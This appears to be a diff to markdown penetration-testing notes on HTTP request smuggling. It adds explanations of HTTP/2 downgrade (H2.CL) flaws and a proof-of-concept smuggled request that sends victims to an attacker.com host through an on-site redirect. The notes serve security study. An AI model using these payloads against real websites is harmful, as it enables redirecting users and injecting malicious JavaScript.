@@ -1,4 +1,10 @@
-# HTTP/1 Request Smuggling
+# HTTP Request Smuggling
+
+## Harmless -> Exploitable
+### On-Site Redirect -> Open Redirect
+Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash. This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. Example [PoC](#h2cl--on-site-redirect)
+
+# HTTP/1.1
 Requests first go through a load balancer/reverse proxy/front end, and then get sent to a back end server. If there are inconsistencies between the calculation of the length of the requests, it allows for HTTP request smuggling.
 
 ![Request smuggling schematic](../images/Request_smuggling.png)
@@ -75,4 +81,30 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 100
 
 email=
+```
+
+# HTTP/2
+Some amazing research on HTTP/2 vulnerabilities [here](https://portswigger.net/research/http2) by James Kettle, definitely recommended to read (~35 minutes). 
+
+## HTTP/2 Downgrading Vulnerabilities
+Most of the HTTP/2 vulnerabilities happen because of HTTP/2 downgrading to HTTP/1.1 to the back-end. The front-end server converts the received request to a valid HTTP/1.1 request for the back-end. This is widely used, but can cause vulnerabilities if not correctly implemented with the right precautions.
+
+### H2.CL
+When the front-end blindly uses the received `Content-Length` header in the converted HTTP/1.1 request. Because this header is not used in HTTP/2. Look at this example [PoC](#h2cl--on-site-redirect) using an on-site redirect as an open redirect.
+
+
+## Proof of Concepts
+
+### H2.CL | On-Site Redirect
+This makes use of the feature that a request to `/resources` gets redirected to `<Host>/resources/` ([on-site redirect](#on-site-redirect)). So the next request that gets sent will receive `attacker.com/resources/` as its response. Can cause arbitrary javascript execution if that next request is for a (trusted) javascript file.
+```
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: attacker.com
+Content-Length: 10
+
+x=x
 ```
